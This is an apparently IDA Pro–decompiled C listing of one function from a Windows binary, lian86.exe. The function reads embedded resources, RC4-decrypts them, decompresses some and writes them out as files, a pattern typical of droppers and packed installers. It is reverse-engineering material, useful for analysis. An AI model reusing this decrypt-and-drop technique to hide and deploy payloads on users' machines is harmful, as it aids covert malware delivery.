// lian86.exe @ 0x004026c7  size=1190  name=resource_worker
// 由 IDA Pro 9.4 (iai_hexrays) 反编译还原；非原始源码，语义等价

int __stdcall resource_worker(wchar_t *lpThreadParameter)
{
  int v1; // eax
  int v2; // edx
  int v3; // eax
  int v4; // eax
  wchar_t *v5; // edx
  int v6; // eax
  int v7; // eax
  wchar_t *v8; // edx
  int v9; // eax
  wchar_t *v10; // edx
  int v11; // eax
  wchar_t *v12; // edx
  int v13; // eax
  int v14; // edx
  int v15; // edx
  int v16; // eax
  wchar_t *v17; // edx
  int v19; // eax
  int v20; // edx
  int v22; // [esp+0h] [ebp-58h]
  int v23; // [esp+0h] [ebp-58h]
  int v24; // [esp+0h] [ebp-58h]
  const WCHAR *v25; // [esp+0h] [ebp-58h]
  const WCHAR *v26; // [esp+0h] [ebp-58h]
  int v27; // [esp+4h] [ebp-54h]
  int v28; // [esp+4h] [ebp-54h]
  int v29; // [esp+4h] [ebp-54h]
  int v30; // [esp+4h] [ebp-54h]
  int v31; // [esp+4h] [ebp-54h]
  int v32; // [esp+8h] [ebp-50h]
  int v33; // [esp+8h] [ebp-50h]
  LPWSTR v34; // [esp+8h] [ebp-50h]
  int v35; // [esp+8h] [ebp-50h]
  LPWSTR v36; // [esp+8h] [ebp-50h]
  int v37; // [esp+8h] [ebp-50h]
  LPWSTR v38; // [esp+8h] [ebp-50h]
  int v39; // [esp+8h] [ebp-50h]
  int v40; // [esp+8h] [ebp-50h]
  wchar_t *v41; // [esp+8h] [ebp-50h]
  int v42; // [esp+8h] [ebp-50h]
  int v43; // [esp+8h] [ebp-50h]
  LPVOID v44; // [esp+Ch] [ebp-4Ch] BYREF
  __int64 nNumberOfBytesToWrite; // [esp+10h] [ebp-48h]
  __int64 dwBytes; // [esp+18h] [ebp-40h] BYREF
  __int64 v47; // [esp+20h] [ebp-38h]
  int inited; // [esp+28h] [ebp-30h]
  int v49; // [esp+2Ch] [ebp-2Ch]
  LPCWSTR lpName; // [esp+30h] [ebp-28h] BYREF
  LPCWSTR v51; // [esp+34h] [ebp-24h] BYREF
  HRSRC hResInfo; // [esp+38h] [ebp-20h]
  HRSRC ResourceW; // [esp+3Ch] [ebp-1Ch]
  LPCVOID lpBuffer; // [esp+40h] [ebp-18h]
  wchar_t *String; // [esp+44h] [ebp-14h] BYREF
  LPVOID lpMem; // [esp+48h] [ebp-10h]
  int v57; // [esp+4Ch] [ebp-Ch]

  mutex_enter();
  str_init((int)&v44, lpThreadParameter);
  inited = init_config();
  v49 = 0;
  do
  {
    if ( inited < v49 )
      break;
    v32 = str_append();
    v27 = str_append();
    v22 = str_append();
    v1 = str_append();
    sub_40D780(*(LPCWCH *)(12 * v49 + dword_4180F0 + 4), 3, v1);
    sub_405182();
    sub_405EB0(v2 + v22, v27);
    str_assign((LPVOID *)&lpName, v32);
    v33 = str_append();
    v3 = str_append();
    sub_405E10(lpName, v3);
    str_assign((LPVOID *)&v51, v33);
    hResInfo = FindResourceW(hModule, lpName, (LPCWSTR)0xA);
    ResourceW = FindResourceW(hModule, v51, (LPCWSTR)0xA);
    if ( hResInfo != nullptr )
    {
      lpBuffer = load_resource_copy(hModule, hResInfo);
      nNumberOfBytesToWrite = buf_length(lpBuffer);
      v34 = dword_4180A8;
      v4 = str_append();
      v5 = v34;
      v35 = v4;
      str_append_w(v5);
      str_append_w(dword_4180C4);
      str_append_w(*(wchar_t **)(12 * v49 + dword_4180F0 + 4));
      str_assign((LPVOID *)&String, v35);
      rc4_crypt(lpBuffer, nNumberOfBytesToWrite, (wchar_t *)lpWideCharStr);
      write_file(String, lpBuffer, nNumberOfBytesToWrite, SHIDWORD(nNumberOfBytesToWrite));
      if ( dword_4180DC == 1 )
        sub_40ADC5(String, *(_DWORD *)(12 * v49 + dword_4180F0));
    }
    else if ( ResourceW != nullptr )
    {
      lpBuffer = load_resource_copy(hModule, ResourceW);
      v6 = buf_length(lpBuffer);
      nNumberOfBytesToWrite = v6;
      rc4_crypt(lpBuffer, v6, (wchar_t *)lpWideCharStr);
      v47 = sub_40A320(lpBuffer);
      dwBytes = sub_40A320((char *)lpBuffer + 8);
      lpMem = xmalloc(dwBytes);
      v36 = dword_4180A8;
      v7 = str_append();
      v8 = v36;
      v37 = v7;
      str_append_w(v8);
      str_append_w(dword_4180C4);
      str_append_w(*(wchar_t **)(12 * v49 + dword_4180F0 + 4));
      str_assign((LPVOID *)&String, v37);
      if ( lpMem != nullptr )
      {
        v57 = zlib_inflate_blob((int)lpMem, (int)&dwBytes, (int)lpBuffer + 16, (_DWORD)v47);
        write_file(String, lpMem, dwBytes, SHIDWORD(dwBytes));
        if ( dword_4180DC == 1 )
          sub_40ADC5(String, *(_DWORD *)(12 * v49 + dword_4180F0));
        sub_40A200(lpMem);
      }
    }
    else
    {
      v38 = dword_4180A8;
      v9 = str_append();
      v10 = v38;
      v39 = v9;
      str_append_w(v10);
      str_append_w(dword_4180C4);
      str_append_w(*(wchar_t **)(12 * v49 + dword_4180F0 + 4));
      str_assign((LPVOID *)&String, v39);
      write_file(String, lpMem, 0, 0);
      if ( dword_4180DC == 1 )
        sub_40ADC5(String, *(_DWORD *)(12 * v49 + dword_4180F0));
    }
    if ( file_exists(String) != 0 )
    {
      ++dword_4180D8;
      v40 = str_append();
      v28 = str_append();
      get_short_path(String);
      sub_40E720(v28);
      v23 = dword_4180E0;
      v11 = str_append();
      v12 = (wchar_t *)v23;
      v24 = v11;
      str_append_w(v12);
      str_append();
      v13 = str_append();
      fmt_int(dword_4180D8, dword_4180D8 >> 31, v13);
      sub_405182();
      v25 = (const WCHAR *)(v14 + v24);
      sub_405182();
      sub_4099A5(v25, (LPCWSTR)(v15 + v29));
      sub_4051A0(v40);
      sub_40AB74((int *)::lpMem);
      v41 = String;
      v16 = str_append();
      v17 = v41;
      v42 = v16;
      str_append_w(v17);
      str_assign((LPVOID *)(dword_418104 + 8), v42);
    }
  }
  while ( !__OFADD__(1, v49++) );
  sub_40A200((LPVOID)lpBuffer);
  v43 = str_append();
  v30 = str_append();
  v19 = str_append();
  fmt_int(dword_4180D8, dword_4180D8 >> 31, v19);
  sub_40E720(v30);
  v26 = ::lpName;
  sub_405182();
  sub_4099A5(v26, (LPCWSTR)(v20 + v31));
  sub_4051A0(v43);
  init_config();
  sub_40E5F0((LPVOID)lpName);
  sub_40E5F0((LPVOID)v51);
  sub_40E5F0(String);
  return sub_40E5F0(v44);
}

